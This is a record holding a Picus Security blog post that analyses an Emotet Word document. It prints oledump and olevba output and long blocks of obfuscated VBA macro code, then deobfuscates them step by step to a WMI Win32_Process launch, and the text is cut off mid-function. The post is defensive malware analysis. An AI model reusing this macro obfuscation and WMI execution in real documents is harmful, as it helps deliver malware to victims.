{
    "id": "9c340698-66e4-45f2-964c-419ce788b495",
    "created_at": "2023-01-12T15:06:40.551065Z",
    "updated_at": "2025-03-27T02:05:28.938657Z",
    "deleted_at": null,
    "sha1_hash": "3d9053a27534ce814e0a41be6d07661cf0247ba7",
    "title": "2020-01-30 - Emotet Technical Analysis - Part 1 Reveal the Evil Code",
    "authors": "",
    "file_creation_date": "2022-05-29T10:38:21Z",
    "file_modification_date": "2022-05-29T10:38:21Z",
    "file_size": 1802641,
    "plain_text": "# Emotet Technical Analysis - Part 1 Reveal the Evil Code\n\n**[picussecurity.com/blog/emotet-technical-analysis-part-1-reveal-the-evil-code](https://www.picussecurity.com/blog/emotet-technical-analysis-part-1-reveal-the-evil-code)**\n\n### Keep up to date with latest blog posts\n\n#### Emotet was first identified in 2014 as a banking malware stealing sensitive and private information. Although Emotet has been used for years by attackers as a banking malware organized in botnet, we observe that recently it is being used as Infrastructure as a Service (IaaS) for delivering malware, including other banking Trojans. Malware analysts categorize Emotet into epochs depending on command and control (CnC) servers, distribution methods, payloads, and even assigned bots which change over time. In this technical analysis series, we analyzed an Emotet Epoch 2 sample.\n\n We'll reveal obfuscated malicious macro codes in this first part of the Emotet Technical Analysis series. All techniques used by attackers in this malware are mapped to tactics and techniques in the MITRE ATT&CK Framework.\n\n### Initial Access\n\n#### The most common entry vector of Emotet is spearphishing emails. The MITRE ATT&CK Framework classifies spearphishing techniques into Spearphishing Attachment ( MITRE\n\n##### ATT&CK T1193 ), Spearphishing Link ( MITRE ATT&CK T1192 ) and Spearphishing via\n#### Service ( MITRE ATT&CK T1194 ). In this Emotet strain, spearphishing emails include links to websites that deliver Microsoft Office Word documents to the user upon clicking the link (\n```\nUser Execution, MITRE ATT&CK T1024 ). Word documents are not directly attached to\n\n```\n\n-----\n\n#### emails to avoid defenses that may inspect email attachments ( Spearphishing Link,\n\n##### MITRE ATT&CK T1192 ). They include malicious macros that download Emotet banking\n#### malware to the target systems.\n\n We'll analyze the following Word document step by step with you:\n```\nMD5: 515f13034bc4ccf635b026722fd5ef9c\nSHA-1: 8925b822e1d86d787b4682d1bb803cf1f5ea7031\nSHA-256: FF76FF1440947E3DD42578F534B91FDB8229C1F40FED36A3DD5688DBC51F0014\nVirusTotal detection rate: 13/61 (as of January 21, 2020\nNames: ST_28546448.doc, 01856218536426646.doc\n\n This word document is distributed by the following links contained in emails:\n\n hxxps://alokhoa.vn/wp-content/uploads/lm/1-91751097-8408196-fcan6yhfsu-gg5ak/\n\n hxxp://honamcharity.ir/mmth4/Documentation/gepvh74lcq7h/\n\n hxxp://lvita.co/tmp/Reporting/\n\n hxxp://www.selloderaza.cl/wp-snapshots/balance/e2o6-62079720-0865-srgnquu24o- ppcdh20p/\n\n### Execution\n\n#### When a victim opens the document, Microsoft Word asks to enable/disable macros. It reveals that macros are embedded in the document ( Scripting, MITRE ATT&CK T1064 ).\n\n The malicious document claims that the user must \"Enable content\" to open the document. However, enabling content launches the code in the macros.\n\n```\n\n-----\n\n### Defense Evasion\n\n#### We start by analyzing VBA macros with oledump.py .\n\n ðŸ’¡\n\n oledump.py is a script that we use to analyze OLE files and data streams in these files.\n\n ðŸ’¡\n\n Object Linking & Embedding (OLE) is a proprietary technology developed by Microsoft that allows embedding and linking to documents and other objects.\n```\noledump.py reveals dozens of macros, and some of them are empty.\n 1:   4096 '\\x05DocumentSummaryInformation'\n 2:    420 '\\x05SummaryInformation'\n 3:   6952 '1Table'\n 4:  173292 'Data'\n 5:    97 'Macros/Bkfiqlsjzo/\\x01CompObj'\n 6:    267 'Macros/Bkfiqlsjzo/\\x03VBFrame'\n 7:    38 'Macros/Bkfiqlsjzo/f'\n 8:     0 'Macros/Bkfiqlsjzo/o'\n 9:    97 'Macros/Cirlqxmy/\\x01CompObj'\n 10:    265 'Macros/Cirlqxmy/\\x03VBFrame'\n 11:    38 'Macros/Cirlqxmy/f'\n 12:     0 'Macros/Cirlqxmy/o'\n 13:    97 'Macros/Crpckdmcyo/\\x01CompObj'\n 14:    267 'Macros/Crpckdmcyo/\\x03VBFrame'\n 15:    38 'Macros/Crpckdmcyo/f'\n 16:     0 'Macros/Crpckdmcyo/o'\n 17:    97 'Macros/Cvvqkbkmpnr/\\x01CompObj'\n 18:    268 'Macros/Cvvqkbkmpnr/\\x03VBFrame'\n 19:    38 'Macros/Cvvqkbkmpnr/f'\n 20:     0 'Macros/Cvvqkbkmpnr/o'\n ............ stripped ............\n\n```\n\n-----\n\n#### We also parse the document with olevba .\n\n ðŸ’¡\n\n Olevba is a script to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel) for detecting VBA (Visual Basic for Applications) macros and extract their source code.\n\n When we parse the Word document with olevba, it also reveals dozens of macro streams, and some of them are empty.\n```\nolevba 0.55.1 on Python 2.7.12 - http://decalage.info/python/oletools\n===============================================================================\nFILE: ST_28546448.doc\nType: OLE\n------------------------------------------------------------------------------VBA MACRO Lunzqxdidt.cls\nin file: ST_28546448.doc - OLE stream: u'Macros/VBA/Lunzqxdidt'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Private Sub Document_open()\nAwzttocpmk\nEnd Sub\n------------------------------------------------------------------------------VBA MACRO Dtcqcidgf.frm\nin file: ST_28546448.doc - OLE stream: u'Macros/VBA/Dtcqcidgf'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (empty macro)\n------------------------------------------------------------------------------VBA MACRO Bkfiqlsjzo.frm\nin file: ST_28546448.doc - OLE stream: u'Macros/VBA/Bkfiqlsjzo'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (empty macro)\n------------------------------------------------------------------------------VBA MACRO Ehmkurtl.frm\nin file: ST_28546448.doc - OLE stream: u'Macros/VBA/Ehmkurtl'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (empty macro)\n------------------------------------------------------------------------------VBA MACRO Ydkbuixknjvib.frm\nin file: ST_28546448.doc - OLE stream: u'Macros/VBA/Ydkbuixknjvib'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (empty macro)\n------------------------------------------------------------------------------VBA MACRO Jzvaecqzzki.frm\nin file: ST_28546448.doc - OLE stream: u'Macros/VBA/Jzvaecqzzki'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (empty macro)\n............ stripped............\n\n```\n\n-----\n\n#### Olevba uncovers that there are some suspicious macro codes in the document, such as\n```\nHex and Base64 encoded strings, ChrW and ShowWindow functions. We used -decode and --deobf paramaters of olevba to decode and deobfuscate macro streams\n\n but they do not reveal because macro codes are heavily obfuscated ( Obfuscated Files\n\n##### or Information, MITRE ATT&CK T1027 ).\n+----------+--------------------+---------------------------------------------+\n|Type   |Keyword       |Description                 |\n+----------+--------------------+---------------------------------------------+\n|AutoExec |Document_open    |Runs when the Word or Publisher document is | | |\n|opened                    |\n|Suspicious|showwindow     |May hide the application           |\n|Suspicious|ChrW        |May attempt to obfuscate specific strings  |\n|     |          |(use option --deobf to deobfuscate)     |\n|Suspicious|Hex Strings     |Hex-encoded strings were detected, may be  |\n|     |          |used to obfuscate strings (option --decode to|\n|     |          |see all)                   |\n|Suspicious|Base64 Strings   |Base64-encoded strings were detected, may be |\n|     |          |used to obfuscate strings (option --decode to|\n|     |          |see all)                   |\n+----------+--------------------+---------------------------------------------+\n\n#### ðŸ’¡\n\n Olevba also detects security-related patterns such as auto-executable macros, suspicious VBA keywords used by malware and several common obfuscation methods including Hex and Base64 encoding.\n\n There are too many macro streams to analyze in the analyzed document, but olevba revealed the starting point: Document_open sub.\n1.\nPrivate Sub Document_open()\nAwzttocpmk End Sub\n\n Let' look at Awzttocpmk function:\n\n```\n\n-----\n\n```\n2.\nfunction Awzttocpmk()\ndv = \"in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=t\" + ChrW(wdKeyS) +\n\":=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_\" + Dtcqcidgf.\nEkrdfjzpyjnsx +\n\"r=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns=\"\nFor Bekkjavx = rgfasd To Qforoylvscd\newr = dsf - CVar(er * 23)\nMdwqzgbq = CSng(Pagurlxflyza)\nBgcfzyxxfdxh = CLng(Wriwwmyrie)\nNext\nIf er > Uwrwalpbpt Then\ngggs = Sin(3)\nRvvsucwkyojuq = Bwjxxmpd\nIclrlucmm = CByte(8 - CSng(3))\nEnd If\n............ stripped (216) lines ............\n\n#### Expand the full code of Awzttocpmk function\n\n```\n\n-----\n\n```\n2.\nFunction Awzttocpmk()\ndv = \"in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=t\" + ChrW(wdKeyS) +\n\":=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_\" +\nDtcqcidgf.Ekrdfjzpyjnsx +\n\"r=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns=\"\n  For Bekkjavx = rgfasd To Qforoylvscd\n     ewr = dsf - CVar(er * 23)\n           Mdwqzgbq = CSng(Pagurlxflyza)\n      Bgcfzyxxfdxh = CLng(Wriwwmyrie)\n      Next\n   If er > Uwrwalpbpt Then\n     gggs = Sin(3)\n           Rvvsucwkyojuq = Bwjxxmpd\n      Iclrlucmm = CByte(8 - CSng(3))\nEnd If\n   If sdf > Qgxfhjlg Then\n     wer3 = Sin(1)\n           Gyhoefvgjbrum = Ksmtghdx\n      Qmspddxoib = CByte(234 - CSng(3))\nEnd If\nFor Dhohgcej = rgfasd To Mfxqzmgpdafd\n     ewr = dsf - CDbl(er * 23)\n           Cqgxugdjvgpf = CSng(Bbssovansmekh)\n      Dyzsvepvgopqc = CLng(Auhhnchmott)\n      Next\nfd = \"=mmuusns=\"\n  For Fvucxrbdv = rgfasd To Uqkgtvihq\n     ewr = dsf - CVar(er * 23)\n           Cfhbnbovrjcby = CSng(Xbqwcrgwip)\n      Gfvovqgtpuvda = CLng(Vwrolikxhrtnh)\n      Next\n   If er > Zmmeiqwvg Then\n     gggs = Sin(3)\n           Ftcfmworkaqa = Whowbdzxgvj\n      Fjzbkdtcqubfx = CByte(8 - CSng(3))\nEnd If\n   If sdf > Liimwplihyf Then\n     wer3 = Sin(1)\n           Imhwuzihkyfw = Fmnqeeklym\n      Guarcfvbuene = CByte(234 - CSng(3))\nEnd If\nFor Qhajdqadgvuia = rgfasd To Wnuaatogt\n     ewr = dsf - CDbl(er * 23)\n           Avrbyifgocloj = CSng(Dnfwuertyqte)\n      Bbhndpfme = CLng(Cupgkyktgp)\n      Next\nAzofmlab = Split(\"=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=w\" + dv + T, fd)\n  For Ykkyqqckszh = rgfasd To Filpjgycxaon\n     ewr = dsf - CVar(er * 23)\n           Opdrenhfsiab = CSng(Yrghyaqlgy)\n      Unbjwkrvouoh = CLng(Lapdoiepdftg)\n      Next\n   If er > Fdjfqjsudjlqj Then\n     gggs = Sin(3)\n\n```\n\n-----\n\n```\n           Ddzeeopvcjsq Vppuspkljr\n      Rwgryzxu = CByte(8 - CSng(3))\nEnd If\n   If sdf > Ucljpihw Then\n     wer3 = Sin(1)\n           Mkhtwwqqksth = Xtolltsl\n      Umjjacemtbog = CByte(234 - CSng(3))\nEnd If\nFor Ucigkhimsj = rgfasd To Tvkdabaoyjmhq\n     ewr = dsf - CDbl(er * 23)\n           Goinrecqjll = CSng(Liuaxeji)\n      Anfanlpaqcs = CLng(Jvtsrebsoaxdq)\n      Next\nDlgwrtobrxjmm = Join(Azofmlab, \"\")\n  For Jxwpetpsjt = rgfasd To Rtmdajsyfgb\n     ewr = dsf - CVar(er * 23)\n           Qppckogvvy = CSng(Pylldflb)\n      Xgnsotlddvod = CLng(Apzfxvwv)\n      Next\n   If er > Klhmbaqh Then\n     gggs = Sin(3)\n           Riprankrumplk = Ofgeeuccmi\n      Yccegrolrz = CByte(8 - CSng(3))\nEnd If\n   If sdf > Jkearkzbz Then\n     wer3 = Sin(1)\n           Ujchepfcjxa = Rhitvwuoxbu\n      Bkcjbmxohve = CByte(234 - CSng(3))\nEnd If\nFor Vlxzhjzpjj = rgfasd To Fdgzxihoo\n     ewr = dsf - CDbl(er * 23)\n           Azwoobkmekkb = CSng(Yuluasbaevj)\n      Kmwvwhqwzlu = CLng(Zxxvubyiynv)\n      Next\nSet Fcbxktofsye = GetObject(Dlgwrtobrxjmm)\n  For Wkthmcuz = rgfasd To Ouwshhhyqksi\n     ewr = dsf - CVar(er * 23)\n           Wjuaylqcfdn = CSng(Ikkfxtpygk)\n      Cozfojopfkdht = CLng(Blpsfrwy)\n      Next\n   If er > Fuofoqyad Then\n     gggs = Sin(3)\n           Rwruyaexgcmwt = Rsogfpkzio\n      Rufhqfcjpx = CByte(8 - CSng(3))\nEnd If\n   If sdf > Qsahdsyvr Then\n     wer3 = Sin(1)\n           Flwqhgxifyrnc = Vrqextuipnpc\n      Qespvzvtovd = CByte(234 - CSng(3))\nEnd If\nFor Shzexhixgen = rgfasd To Lchcsdcsp\n     ewr = dsf - CDbl(er * 23)\n           Xhazccvbfecap = CSng(Vmsjzflqosl)\n      Zpwcnahq = CLng(Uejlybjbrt)\n      Next\n\n```\n\n-----\n\n```\nRpkdwysvusev Dtcqcidgf.Fshewmvxnlq.Tag\nIxldqggmg = Dlgwrtobrxjmm + ChrW(wdKeyS) + Dtcqcidgf.Hsinculclm.Tag + Rpkdwysvusev\n  For Kfwvcraz = rgfasd To Vwqgwymmhpx\n     ewr = dsf - CVar(er * 23)\n           Hgvulaykhidq = CSng(Mnexsobqg)\n      Kchomccm = CLng(Ogxozydonmq)\n      Next\n   If er > Aydreiqrartb Then\n     gggs = Sin(3)\n           Wugadgqyghi = Ycsrkhkhpik\n      Wxnpdnbh = CByte(8 - CSng(3))\nEnd If\n   If sdf > Hlnwbcswilss Then\n     wer3 = Sin(1)\n           Aitnjglwd = Tkrdvrjqil\n      Lifxmbmmeigov = CByte(234 - CSng(3))\nEnd If\nFor Xahlionisat = rgfasd To Ibgvvlieejzu\n     ewr = dsf - CDbl(er * 23)\n           Eldciaclqa = CSng(Ixanxtnsddbkt)\n      Ktriqsbixo = CLng(Nqxlguyckd)\n      Next\nYbdakolbjc = Ixldqggmg + Dtcqcidgf.Ekrdfjzpyjnsx\n  For Fgealfhi = rgfasd To Eyoxzsavk\n     ewr = dsf - CVar(er * 23)\n           Taljfnjpcbd = CSng(Ehxnfhdi)\n      Vmbkrkkar = CLng(Mftrgsxtqeb)\n      Next\n   If er > Srumqdjfss Then\n     gggs = Sin(3)\n           Dcsfsbldosbew = Goldugprapx\n      Ghtndtcpfny = CByte(8 - CSng(3))\nEnd If\n   If sdf > Cxapqqrodqh Then\n     wer3 = Sin(1)\n           Qnlspurxwgyob = Zaamzfesrkygs\n      Qmyhdpem = CByte(234 - CSng(3))\nEnd If\nFor Mrfqbapo = rgfasd To Cquprmuthrn\n     ewr = dsf - CDbl(er * 23)\n           Tplpuzguncjnn = CSng(Pjjswkaa)\n      Qqulfgpmsl = CLng(Luopvonkbdn)\n      Next\nSet Awzttocpmk = GetObject(Ybdakolbjc)\n  For Ruqbuxxdchv = rgfasd To Edlajgene\n     ewr = dsf - CVar(er * 23)\n           Mfzbtjevsj = CSng(Zeeutsxyf)\n      Mbycrpudnhg = CLng(Yvjtcayyoxm)\n      Next\n   If er > Mkuhoeson Then\n     gggs = Sin(3)\n           Hnfyfdzsppwx = Wfvtxdlf\n      Jifscwal = CByte(8 - CSng(3))\nEnd If\n   If sdf > Mpuzskythpp Then\n\n```\n\n-----\n\n```\n     wer3 Sin(1)\n           Drzwvpwjba = Xxgqspkcurh\n      Anfsyxnxwcbda = CByte(234 - CSng(3))\nEnd If\nFor Zekoskvnsdoae = rgfasd To Ljoaubqqccor\n     ewr = dsf - CDbl(er * 23)\n           Emskodpgtrlf = CSng(Pkximfqrozk)\n      Ohldtvsnq = CLng(Qhceqwopbdb)\n      Next\nAwzttocpmk. _\nshowwindow = False\n  For Cgrjopyakkgj = rgfasd To Wonvluwmw\n     ewr = dsf - CVar(er * 23)\n           Svafwthrhpl = CSng(Spdpdyuipbwks)\n      Cvpkjsvtx = CLng(Rysgtlurdvq)\n      Next\n   If er > Xnidududdc Then\n     gggs = Sin(3)\n           Zbkcwvfuoh = Ihlpamklogn\n      Sztalowduu = CByte(8 - CSng(3))\nEnd If\n   If sdf > Ogzlmuqrsv Then\n     wer3 = Sin(1)\n           Fcrrdxsnnsev = Dsymonbfmfka\n      Xfrwnbviwf = CByte(234 - CSng(3))\nEnd If\nFor Bwwvcdzsrxsgg = rgfasd To Zqmhcwgqibh\n     ewr = dsf - CDbl(er * 23)\n           Yuwtmsmfjq = CSng(Biuamkqol)\n      Kxwzvfnuuvpu = CLng(Ztomlpzi)\n      Next\nDo While Fcbxktofsye. _\nCreate(er & Ysjchbkkg, Swdtudgkjzjs, Awzttocpmk, Dzzebvtpbu)\nLoop\n  For Onobifnwx = rgfasd To Njsvmeei\n     ewr = dsf - CVar(er * 23)\n           Bnkueublgzl = CSng(Kiuiqprkny)\n      Bcbpfffqrnae = CLng(Klkqisex)\n      Next\n   If er > Swosxdoovc Then\n     gggs = Sin(3)\n           Avbufstwipam = Awpwnduox\n      Nsnzlieaslo = CByte(8 - CSng(3))\nEnd If\n   If sdf > Nmdlecvcnsd Then\n     wer3 = Sin(1)\n           Ypzxmysdsafxw = Mmulhbjbzjkun\n      Akhmjpav = CByte(234 - CSng(3))\nEnd If\nFor Wkvlynhvzpa = rgfasd To Kxpozncefqrz\n     ewr = dsf - CDbl(er * 23)\n           Kxglrvvkrop = CSng(Cznxzdrwptabi)\n      Rudmcxxxse = CLng(Xagbzxrz)\n      Next\nEnd Function\n\n```\n\n-----\n\n#### As seen in the codes, there are hundreds of loops, declarations, conditions, type conversions and variable assignments to obfuscate codes, and many of them are never used. Since,\n\n##### olevba could not deobfuscate the macro codes, we try ViperMonkey for deobfuscation.\n\n#### ðŸ’¡\n\n ViperMonkey is a VBA Emulation engine written in Python, designed to analyze and deobfuscate malicious VBA Macros contained in Microsoft Office files.\n```\n............ stripped ............\nERROR  Impossible to operate on arguments of different types. invalid literal for\nint() with base 10: ''\nINFO   calling Function: CDbl(0)\nERROR  Impossible to operate on arguments of different types. invalid literal for\nint() with base 10: 'NULL'\nWARNING Variable 'Cznxzdrwptabi' not found\nINFO   calling Function: CSng('NULL')\nWARNING Variable 'Xagbzxrz' not found\nINFO   calling Function: CLng('NULL')\nERROR  Cannot update loop counter. Breaking loop. invalid literal for int() with\nbase 10: 'NULL'\n............ stripped ............\n\n ViperMonkey doesnâ€™t deobfuscate macro codes either, so it's time now for the manual analysis. When we clear macro codes by removing never used loops, declarations, conditions, type conversions and variables, we reveal the following code from hundreds of lines of code.\n3.\nFunction Awzttocpmk()\ndv = \"in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=t\" + ChrW(wdKeyS) +\n\":=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_\" +\nDtcqcidgf.Ekrdfjzpyjnsx +\n\"r=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns=\"\nfd = \"=mmuusns=\"\nAzofmlab = Split(\"=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=w\" + dv + T, fd)\nDlgwrtobrxjmm = Join(Azofmlab, \"\")\nSet Fcbxktofsye = GetObject(Dlgwrtobrxjmm)\nRpkdwysvusev = Dtcqcidgf.Fshewmvxnlq.Tag\nIxldqggmg = Dlgwrtobrxjmm + ChrW(wdKeyS) + Dtcqcidgf.Hsinculclm.Tag + Rpkdwysvusev\nYbdakolbjc = Ixldqggmg + Dtcqcidgf.Ekrdfjzpyjnsx\nSet Awzttocpmk = GetObject(Ybdakolbjc)\nAwzttocpmk. showwindow = False\nDo While Fcbxktofsye. Create(er & Ysjchbkkg, Swdtudgkjzjs, Awzttocpmk, Dzzebvtpbu)\nLoop\nEnd Function\n\n Other than declarations and variable assignments, there is only one meaningful loop in this function:\n4. Do While Fcbxktofsye.Create(er & Ysjchbkkg, Swdtudgkjzjs, Awzttocpmk, Dzzebvtpbu)\nLoop\n\n```\n\n-----\n\n#### First, we need to find Fcbxktofsye in the Awzttocpmk() function :\n```\n5. Set Fcbxktofsye = GetObject(Dlgwrtobrxjmm)\n\n So, we need to find Dlgwrtobrxjmm in the function:\n6. Dlgwrtobrxjmm = Join(Azofmlab, \"\")\n\n When we put 6. in place of Dlgwrtobrxjmm in 5., we get:\n7. Set Fcbxktofsye = GetObject(Join(Azofmlab, \"\"))\n\n Now, we need to find Azofmlab to find Fcbxktofsye . Azofmlab is defined in the macro codes:\n8. Azofmlab = Split(\"=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=w\" + dv + T, fd)\n\n When we put 8. in place of Azofmlab in 7., we get:\n9. Set Fcbxktofsye =\nGetObject(Join(Split(\"=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=w\" + dv + T, fd),\n\"\"))\n\n So, we must find dv, T and fd variables.\ndv is defined in the macro codes:\n10. dv = \"in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=t\" +\nChrW(wdKeyS) + \":=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_\" +\nDtcqcidgf.Ekrdfjzpyjnsx +\n\"r=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns=\"\n\n Now, we need to find the value of the ChrW(wdKeyS) function and\nDtcqcidgf.Ekrdfjzpyjnsx to reveal dv .\n\n ðŸ’¡\n\n wdKeyS is an example of wdKey enumeration in Word, which specifies a keyboard character.\n\n According to wdKey enumeration, wdKeyS is 83 .\n11. ChrW(wdKeyS) = ChrW(83)\n\n ðŸ’¡\n\n ChrW(CharCode) converts CharCode long integer to string.\n\n According to ASCII code, 83 specifies the S character, so ChrW(83) is equal to the S character.\n\n```\n\n-----\n\n```\n12. ChrW(wdKeyS) S\n\n#### So, ChrW(wdKeyS) is equal to the S character, but adversaries used this function instead of a simple \"S\" in order to obfuscate their codes to decrease the detection rate.\n\n Let's find the second unknown variable of dv, which is Dtcqcidgf.Ekrdfjzpyjnsx . But, it does not exist in the macro codes . Because, adversaries hid Dtcqcidgf.Ekrdfjzpyjnsx in VBA forms in the document other than macro codes for obfuscation. It is obvious why automated tools cannot deobfuscate the macro code.\nolevba revealed the form variable Dtcqcidgf.Ekrdfjzpyjnsx :\nVBA FORM Variable \"Ekrdfjzpyjnsx\" IN 'ST_28546448.doc' - OLE stream:\nu'Macros/Dtcqcidgf'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - P\n\n So, the value of the form variable Dtcqcidgf.Ekrdfjzpyjnsx is P .\n13. Dtcqcidgf.Ekrdfjzpyjnsx = \"P\"\n\n Let's put 12. and 13 . in their places in 9 . :\n14. dv = \"in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=t\" + \"S\" +\n\":=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_\" + \"P\" +\n\"r=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns=\"\n\n ðŸ’¡\n   + operator in VBA adds two numbers or returns the positive value of a numeric\n\n expression. It can also be used to concatenate two string expressions.\n\n So, we can concatenate substrings in dv :\n15. dv =\n\"in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=tS:=mmuusns==mmuusns=win=m\n\n We found dv . Now, it is time to find T and fd t o reveal Fcbxktofsye .\nT is not initialized in codes. Microsoft Visual Basic Editors' Locals Window shows its value\n\n as Empty.\n16. T = \"\"\nfd is defined in the macro codes:\n\n```\n\n-----\n\n```\n17. fd mmuusns\n\n#### Let's put 15., 16. and 17. in their places in 10. :\n18. Set Fcbxktofsye =\nGetObject(Join(Split(\"=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=w\" +\n\"in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=tS:=mmuusns==mmuusns=win=m\n + \"\", \"=mmuusns=\"), \"\"))\n\n Get rid of \"+\":\n19. Set Fcbxktofsye =\nGetObject(Join(Split(\"=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=win=mmuusns==mmuusn\n \"=mmuusns=\"), \"\"))\n\n Now, first we must find the result of the Split function.\n\n ðŸ’¡\n\n The Split function is used is to split a string into a number of substrings based on the given delimiter and returns a one-dimensional array of substrings.\n\n We can find the result of the Split function by splitting the text with the delimiter\n=mmuusns= by simply removing all instances of the delimiter in the string:\n20. (\"win\",\"mgm\",\"tS:\",\"win\",\"32\",\"_Pr\",\"oc\",\"ess\")\n\n Let's put the result in its place in 15. :\n21. Set Fcbxktofsye = GetObject(Join((\"win\",\"mgm\",\"tS:\",\"win\",\"32\",\"_Pr\",\"oc\",\"ess\"),\n\"\"))\n\n Now, we need to find the result of the Join function.\n\n ðŸ’¡\n\n The Join function joins an array of substrings into a single string.\n\n So, the result of the Join function is ( Dlgwrtobrxjmm = Join(Azofmlab, \"\") )\n22. Dlgwrtobrxjmm = \"winmgmtS:win32_Process\"\n\n Now, we can reveal the Fcbxktofsye :\n23. Set Fcbxktofsye = GetObject(winmgmtS:win32_Process)\n\n Finally, we get a hint of what this code does:\n\n ðŸ’¡\n\n The Win32_Process is a WMI class representing a process on an operating system.\n\n```\n\n-----\n\n#### Therefore, attackers will run a process using WMI ( Windows Management\n\n##### Instrumentation, MITRE ATT&CK T1047 ) instead of cmd ( Command-Line\n```\nInterface, MITRE ATT&CK T1059 ).\n\n#### ðŸ’¡\n\n Windows Management Instrumentation (WMI) is the infrastructure for management data and operations on Windows-based operating systems. You can write WMI scripts or applications to automate administrative tasks on remote computers but WMI also supplies management data to other parts of the operating system and products.\n\n Let's put 23. into 4. :\n24. Do While GetObject(winmgmtS:win32_Process).Create(er & Ysjchbkkg, Swdtudgkjzjs,\nAwzttocpmk, Dzzebvtpbu) Loop\n\n Now, we must find er, Ysjchbkkg, Swdtudgkjzjs, Awzttocpmk and Dzzebvtpbu variables.\ner variable is not initialized, it is NULL.\n25. er = \"\"\nYsjchbkkg is stored in another function. There are also never used loops, declarations,\n\n conditions, type conversions and variable assignments to obfuscate codes.\n26.\nFunction Ysjchbkkg()\n  For Nagspgiy = rgfasd To Eqsbwirkrwf\n     ewr = dsf - CVar(er * 23)\n           Cafxunqrqgmm = CSng(Tuonppje)\n      Lbrjnfryxgerk = CLng(Kivokgoxfxp)\n      Next\n   If er > Qzkxtglswh Then\n     gggs = Sin(3)\n           Pnosxcjgze = Pxswdllxchh\n      Gxdwuobrdusaf = CByte(8 - CSng(3))\nEnd If\n   If sdf > Fwjltwiwoppk Then\n     wer3 = Sin(1)\n............ stripped (323 lines) ............\n\n Expand the full code of Ysjchbkkg function.\n\n```\n\n-----\n\n```\n26.\nFunction Ysjchbkkg()\n  For Nagspgiy = rgfasd To Eqsbwirkrwf\n     ewr = dsf - CVar(er * 23)\n           Cafxunqrqgmm = CSng(Tuonppje)\n      Lbrjnfryxgerk = CLng(Kivokgoxfxp)\n      Next\n   If er > Qzkxtglswh Then\n     gggs = Sin(3)\n           Pnosxcjgze = Pxswdllxchh\n      Gxdwuobrdusaf = CByte(8 - CSng(3))\nEnd If\n   If sdf > Fwjltwiwoppk Then\n     wer3 = Sin(1)\n           Ihfqwregj = Fwmczwydqsf\n      Ezybphfeflvnm = CByte(234 - CSng(3))\nEnd If\nFor Qqznfvnzvu = rgfasd To Rgfockjlwtdq\n     ewr = dsf - CDbl(er * 23)\n           Lalronmonzsss = CSng(Zdgzpoyzwsdc)\n      Xnimfkmodf = CLng(Csgvkrjtx)\n      Next\nJqzbdljbr = I + ChrW(wdKeyP)\n  For Czoegypdqv = rgfasd To Voclotzgntxuy\n     ewr = dsf - CVar(er * 23)\n           Uavnminf = CSng(Lttuisatgwerz)\n      Hnxjcuftxvd = CLng(Lrijumczf)\n      Next\n   If er > Axasqwdap Then\n     gggs = Sin(3)\n           Vpvfefawz = Sipnuwmepbbsi\n      Ndasdfkfvsno = CByte(8 - CSng(3))\nEnd If\n   If sdf > Yjmzcerdccgnl Then\n     wer3 = Sin(1)\n           Twmaksxv = Sidtvghe\n      Sosfackaymp = CByte(234 - CSng(3))\nEnd If\nFor Bcwbnxeb = rgfasd To Ykwokhvyi\n     ewr = dsf - CDbl(er * 23)\n           Mfdhaiixxumy = CSng(Ryfuhdpd)\n      Vdoascnhpjpx = CLng(Noweqkmlqmti)\n      Next\nLbfipxywqppc = Jqzbdljbr + Dtcqcidgf.Iqjssfeeu + Dtcqcidgf.Zxioomrqvjz\n  For Wdpztkrubhtb = rgfasd To Glywqmcig\n     ewr = dsf - CVar(er * 23)\n           Nflgijeu = CSng(Biizgcdzu)\n      Tocmawysqox = CLng(Gffosyohbbfcq)\n      Next\n   If er > Jyjlrjtrjt Then\n     gggs = Sin(3)\n           Gbprdaktbx = Wbkrmwjka\n      Rfmqomowuk = CByte(8 - CSng(3))\nEnd If\n   If sdf > Fljcbfcim Then\n\n```\n\n-----\n\n```\n     wer3 Sin(1)\n           Ppzcemjx = Symrkvhmavv\n      Efduiexhwicx = CByte(234 - CSng(3))\nEnd If\nFor Kkjknzqmnxk = rgfasd To Vvlngewuwa\n     ewr = dsf - CDbl(er * 23)\n           Tojwqjuj = CSng(Crkikcssfjqub)\n      Uwsetnjrjt = CLng(Qwoqicysu)\n      Next\nsss = 